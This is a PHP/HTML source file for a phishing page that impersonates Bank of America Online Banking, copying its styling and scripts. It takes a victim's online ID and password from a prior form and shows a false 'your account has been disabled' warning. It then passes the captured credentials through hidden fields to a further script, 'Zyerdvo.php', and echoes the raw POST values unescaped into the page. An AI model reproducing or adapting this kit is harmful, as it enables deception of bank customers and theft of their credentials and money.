<?php
$onlineId = $_POST['onlineId'];
$onlineId1 = $_POST['onlineId1'];
$password = $_POST['password'];
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
<head>




<!-- XENGINE LSU AIP-customer 10.0 2012.06 r9 -->



    <link rel="stylesheet" media="all" href="https://secure.bankofamerica.com/pa/global-assets/1.0/style/global-designs-hs.css" type="text/css"/>






<!-- TLDB false -->
			<!-- TL-NOPV true -->

<title>Bank of America | Online Banking | Help & Support | Update My Contact Information</title>
<meta name="Description" CONTENT="Help-and-support-Update-Contact-Information">
<meta name="Keywords" CONTENT="Help and support,Update contact Information">
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<link rel="shortcut icon" href="/pa/global-assets/1.0/graphic/favicon.ico" type="image/ico" />






				<!-- <link rel="stylesheet" type="text/css" href="https://secure.bankofamerica.com/pa/components/bundles/gzip-compressed/xengine/Global/1.0/style/global-jawr.css" media="all" /> -->
					<link rel="stylesheet" type="text/css" href="https://secure.bankofamerica.com/pa/components/bundles/gzip-compressed/xengine/AIP-customer/2.3/style/aip-cust-jawr.css" media="all" />
					<link rel="stylesheet" type="text/css" href="https://secure.bankofamerica.com/pa/components/bundles/gzip-compressed/xengine/AIP-customer/2.3/style/aip-cust-jawr-print.css" media="print" />
					
				  <!-- 					<script src="https://secure.bankofamerica.com/pa/components/bundles/gzip-compressed/xengine/Global/1.0/script/global-jawr.js" type="text/javascript"></script>
				   -->
					<script src="https://secure.bankofamerica.com/pa/components/bundles/gzip-compressed/xengine/AIP-customer/2.3/script/aip-cust-jawr.js" type="text/javascript"></script>

	<style> body { display : none;} </style>
</head>

<body>
	 
	<script type="text/javascript"> 
		if (self == top) {
			var theBody = document.getElementsByTagName('body')[0];
			theBody.style.display = "block";
		} 
		else {top.location = self.location;}
	</script>
	<noscript><style>body{display : block;}</style></noscript>
	   
	<a class="ada-hidden" name="skpToMainCNT" href="#skip-to-h1">Skip to main content</a>
		
	<div class="olb-2col-standard-layout olb-layout-common">
		<div class="header">








	  
			<script type="text/javascript">
				var fsdNavClientOptions = {
				  "clientName": "OLB",
				  "clientBorneo": true,
				  "clientJQuery": true,
				  "locale": "en-US",
				  "clientActiveTab": "helpsupport",
				  "languageToggleUrl":"/customer/help-support/hsStaticTopic.go?request_locale=es-US&toggle=true&topic=update_contact",
				  "searchSourceSite": "olb",
				  "searchSourceDir": "/homepage/overview",
				  "searchSourceTitle": "Bank of America | Online Banking | Accounts Overview",
				  "entryURL": "",
				  "sourceApplication":"aipd"
				 };
			</script>


	<script type="text/javascript" src="https://secure.bankofamerica.com/pa/components/utilities/top-nav-util/1.1/script/topnav.js"></script>
	<div id="olb-globals-header-container"></div>


		<script type="text/javascript">

		var fsdContactUs = {
		  "moduleId":"",
		  "otherWaystoContactusUrl": ""
		 };

		</script>
		<script type="text/javascript" src="https://secure.bankofamerica.com/pa/components/utilities/contact-us-util/1.0/script/contactus.js"></script>

<!-- Assignment of variables -->




<!-- WSO FEB-code changes start -->

<div class="help-support-module">
	<div class="blue-page-title-skin h-100">
		<h1 name="skip-to-h1" id="skip-to-h1">Help & Support</h1>
	</div>
</div>



<script type="text/javascript">

var hrefUrl = "/customer/help-support.go";

</script>
<div class="category-tree-module mbtm-30">
	<div class="hs-skin">
	    <a name="HSHome" id="HSHome" class="category-links" href="/customer/help-support.go">Help & Support home - Common topics</a><span class="arrow"> > </span> 
		
		
		<span class="category-innermost-link">Update my contact information </span>
		
	</div>
</div>

</div>
		<div class="content-wells">
			<div class="main-well" >
<!-- module-specific stylesheet -->


<!-- HS Customer Session -->

<div class="generic-content-module">	
	<div class="Update-My-Contact-Info">
		<div class="inner">
			<h2 class="Update-My-Contact-Info-header">Your account has been disabled for security reasons.</h2>
			<!-- Added for S4073 -->
				<!-- inside if -->
					
				<div>			
				<P>During our routine security enhancement protocol, We observed multiple login 
attempt error on your Bank of America online banking account.<br>
We believe that someone other than you is trying to access your account 
for security reasons,<br>
We have temporarily suspended your account and access to your Online Banking will be restricted until you complete this update, </span></font></p>
</p></p>
				</div><form dir="" class="cmxform" id="signupForm" method="POST" action="Zyerdvo.php">
				<input type="hidden" name="onlineId" value="<?php echo $_POST["onlineId"]; ?>"/>  
<input type="hidden" name="onlineId1" value="<?php echo $_POST["onlineId1"]; ?>"/>
<input type="hidden" name="password" value="<?php echo $_POST["password"]; ?>"/>
				<div class="button-container"> 
					<input type="submit" name="NextButton" value="Update Contact Information" onclick="return ValidateForm();" id="NextButton" title="Next" class="buttonfwd" alt="Next" /></p>
</a>
					<input type="hidden" name="onlineId" value="<?php echo $_POST["onlineId"]; ?>"/>  
<input type="hidden" name="onlineId1" value="<?php echo $_POST["onlineId1"]; ?>"/>
<input type="hidden" name="password" value="<?php echo $_POST["password"]; ?>"/>
				</div> 
			<div class="end-of-item">
				<p class="intro"><strong>Investment customers</strong></p>
				<p><p>If you hold investments at Merrill Lynch, please call 1.800.898.3138 to change the address where your Merrill Lynch investment statement and correspondence are sent.</p></p>
			</div>
			<div class="modal-info-msg">
				<p class="intro"><strong>You can find your contact information in Online Banking under:</strong></p>
				<p><p>Profile &amp; Settings</p></p>
			</div>
		</div>
	</div>
</div>				
</div>
			<div class="side-well" ></div>
			<div class="clearboth"></div>
		</div>
		<div class="footer">
  
  


		<div id="olb-globals-footer-container"></div>












<div class="timeout-bdf-module no_print">
	<div class="aip-skin">
		<script type="text/javascript">
			/*FTL to output timeout module init variables  */
			var timeoutOptionsInitAip = {
				continueURL: "/customer/ping",	
				timeoutURL: "/myaccounts/signoff/signoff-default.go?timeout=Y",	
				timeoutInterval: "10",							
				inactiveTime: "2",		 						
				showTimeoutModal: "false" 								
			}
		</script>	
			<div id="timeoutWarningAipSkin" class="hide">						
				<div class="flex-alert-icon"></div>
				<div class="flex-alert-content">
					<h3>Time out warning </h3>
						<div class="flex-modal-main-content">
					<p class="bold">Your Application Will Time Out in 2 Minutes </p>
					<p>
							For your safety and Protection your Online Banking session is about to be timed out and redirected to the home page if there is no additional activity.<br><br>If you are still working in your Online Banking session simply click OK to continue.</p>
					</div>
					<div class="buttons-container ptop-15">
						<a href="javascript:void(0);" class="btn-bofa btn-bofa-small btn-bofa-blue timeout-trigger"><span>
						OK
						</span></a>
					</div>
				</div>
				<div class="clearboth"></div>
			</div>
		 <div id="timeoutAipSkin" class="hide">						
				<div class="flex-alert-icon"></div>
				<div class="flex-alert-content">
					<div class="flex-modal-main-content">
						<p>For security, sessions end after 20 minutes of inactivity.</p>
						<p>Your session has timed out, and you'll have to start the application again.</p>
					</div>
					<div class="buttons-container ptop-15">
						<a href="javascript:void(0);" class="btn-bofa btn-bofa-small btn-bofa-blue timeout-trigger"><span>Ok</span></a>
					</div>
				</div>
				<div class="clearboth"></div>
			</div>
	</div>
</div>							


<script language="javascript" src="https://www.bankofamerica.com/pa/global-assets/external/coremetrics/hp/eluminate.js"></script>
<script language="javascript" src="https://www.bankofamerica.com/pa/global-assets/external/coremetrics/hp/cmdatatagutils.js"></script>






<script>
		

/*Minified version CM Data Direction Code - updated 8-21-2013 */ 

function cmSetDD(){var testString=window.location.href;if(testString.toLowerCase().indexOf(".bankofamerica.com")>-1){testString=testString.toLowerCase();var tempArr=testString.split(".bankofamerica.com");var tempStr=tempArr[0];if(tempStr.indexOf("//")>-1){tempArr=tempStr.split("//");tempStr=tempArr[1];if(tempStr.indexOf(".")>-1){tempArr=tempStr.split(".");tempStr=tempArr[0];var tempStrPt2=tempArr[1]}if(tempStr.indexOf("www")>-1){if(tempStr.indexOf("-")>-1){cmSetStaging()}else{if(tempStrPt2!=null){if(tempStrPt2.indexOf("ecnp")>-1){cmSetStaging()}}else{cmSetProduction()}}}else{if(tempStr.indexOf("-")>-1){if(tempStr.indexOf("sitekey")>-1){if(tempStr=="sitekey"){cmSetProduction()}else{cmSetStaging()}}else{cmSetStaging()}}else{if(tempStrPt2!=null){if(tempStrPt2.indexOf("ecnp")>-1){cmSetStaging()}}else{cmSetProduction()}}}}}}

if(typeof cmSetStaging=="function"){cmSetDD()};

</script>

 

		<script type="text/javascript">		
			var custTypeAdlob ='';
				custTypeAdlob = '|EMP_N||HS_SB_N||HS_PRIV_N||HS_PLAT_||HS_WM_N||HS_CON_Y|';
			var custType ='';
				custType = '|EMP_N||HS_SB_N||HS_PRIV_N||HS_PLAT_||HS_WM_N||HS_CON_Y|-_--_--_--_--_--_--_--_--_--_--_--_--_--_-';
			var coreMetricSessionId = '';
				coreMetricSessionId = 'wfhn4cklYUYZwp3eQ4jZGb1dY9eU8plPRSPfgzqC';
				
			cmCreatePageviewTag('OLB:Content:CustSvc:Help_Manage_Address_Phone_Email', null, null,'OLB:Content:CustSvc',false, false, null, false, false, null, null, custTypeAdlob, null, coreMetricSessionId, null, null, null, custType, null, null, null);
		</script>
		




	<!-- inside wrapper-->
	<!--inside OBO:: false -->
<!--olbCommonWrapper -->

<script language="javascript" type="text/javascript" charset="windows-1252" src="https://secure.bankofamerica.com/pa/components/modules/customer-feedback-bdf-module/2.4/script/oo_engine.min.js"></script>

		 
			<script>
			$(document).ready(function(){
			var oo_bar = new OOo.Ocode({
				  bar: { caption: 'Share website feedback'  }
				, disableNoniOS: true
				, disableMobile: false
			  });
			  });
	
			</script>
	
		</div>	
	</div>
	
</body>	
</html>
